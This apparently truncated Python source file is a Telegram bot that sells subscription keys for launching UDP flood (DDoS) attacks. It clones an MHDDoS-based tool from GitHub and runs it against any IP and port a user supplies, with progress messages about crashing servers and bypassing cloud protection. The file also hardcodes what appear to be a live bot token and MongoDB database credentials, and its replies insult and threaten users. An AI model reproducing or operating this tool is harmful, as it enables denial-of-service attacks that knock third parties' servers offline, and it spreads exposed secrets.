import telebot
import subprocess
import threading
import time
import random
import os
from telebot import types
from datetime import datetime, timedelta
from pymongo import MongoClient

# --- CONFIG ---
TOKEN = '8676988617:AAF8sRBKuScBqbWP23ggZRrerAGabu0dfCw'
MONGO_URL = "mongodb+srv://riderbhai:riderbhai321@cluster0.yvrweuu.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
ADMIN_ID = 6075779781 
bot = telebot.TeleBot(TOKEN)

# --- MONGODB CONNECTION ---
client = MongoClient(MONGO_URL)
db = client['RiderBot']
users_col = db['users']
keys_col = db['keys']

# --- ENGINE SETUP ---
if not os.path.exists("MHDDoS"):
    os.system("git clone https://github.com/Grizzly-Anis/MHDDoS-Lite.git MHDDoS")

# --- PROGRESS BAR ---
def get_progress_bar(percent):
    bar_length = 10
    filled = int(percent / 10)
    return "🔥" * filled + "🌑" * (bar_length - filled)

# --- ATTACK LOGIC ---
def run_attack(ip, port, duration, chat_id, message_id, username):
    threads = random.randint(1500, 2000)
    command = f"python3 start.py UDP {ip} {port} {threads} {duration}"
    
    try:
        process = subprocess.Popen(command, shell=True, cwd="./MHDDoS")
        start_time = time.time()
        
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            remaining = int(duration - elapsed)
            percent = min(100, int((elapsed / duration) * 100))
            bar = get_progress_bar(percent)
            
            try:
                bot.edit_message_text(
                    chat_id=chat_id, message_id=message_id,
                    text=(f"🚀 **VVIP ATTACK IN PROGRESS** 🚀\n"
                          f"━━━━━━━━━━━━━━━━━━━━━━\n"
                          f"👤 **Attacker:** `@{username}`\n"
                          f"🎯 **Target:** `{ip}:{port}`\n"
                          f"⏳ **Remaining:** `{remaining}s` / `{duration}s`\n"
                          f"📊 **Power:** `{bar} {percent}%` \n"
                          f"🛡️ **System:** `BYPASSING CLOUD... ✅` \n"
                          f"━━━━━━━━━━━━━━━━━━━━━━\n"
                          f"⚠️ **Note:** Do not spam commands!"),
                    parse_mode="Markdown"
                )
            except: pass
            time.sleep(5)
        
        process.terminate()
        bot.send_message(chat_id, f"✅ **ATTACK FINISHED!**\nTarget `{ip}` was successfully hammered. 🔥")
    except: pass

# --- KEYBOARDS ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('🚀 Start VVIP Attack', '👤 My Profile', '🔑 Redeem Key')
    return markup

# --- COMMANDS ---

@bot.message_handler(commands=['start'])
def welcome(m):
    user_id = m.from_user.id
    user_data = users_col.find_one({"user_id": user_id})
    
    is_valid = (user_id == ADMIN_ID)
    if not is_valid and user_data:
        if datetime.strptime(user_data['expiry'], '%Y-%m-%d %H:%M:%S') > datetime.now():
            is_valid = True

    if is_valid:
        bot.send_message(m.chat.id, f"💀 **Welcome back, Legend @{m.from_user.username}!**\nSystem is ready to crash servers.", reply_markup=main_menu())
    else:
        # Dhamki Message for No-Key users
        bot.send_message(m.chat.id, f"🚫 **ACCESS DENIED, CHUTIYE!** 🚫\n\nBeta, bina subscription ke bot touch karne ki himmat kaise hui? 😂\n\nAb chup-chap Admin @FLEXOP01 se key khareed le, warna yahi se block maar dunga! 🖕", parse_mode="Markdown")

@bot.message_handler(commands=['genkey'])
def gen(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        days = int(m.text.split()[1])
        key = f"RIDER-{random.randint(1000, 9999)}"
        keys_col.insert_one({"key": key, "days": days})
        # Direct Copy-Paste Format
        bot.send_message(m.chat.id, f"🔑 **VVIP KEY CREATED**\n\nClick to copy:\n`/redeem {key}`\n\n**Validity:** {days} Days")
    except: bot.reply_to(m, "Usage: `/genkey 1`")

@bot.message_handler(commands=['redeem'])
def redeem(m):
    user_id = m.from_user.id
    parts = m.text.split()
    if len(parts) < 2:
        bot.reply_to(m, "❌ Key dalo bewakoof! Example: `/redeem RIDER-1234`")
        return
        
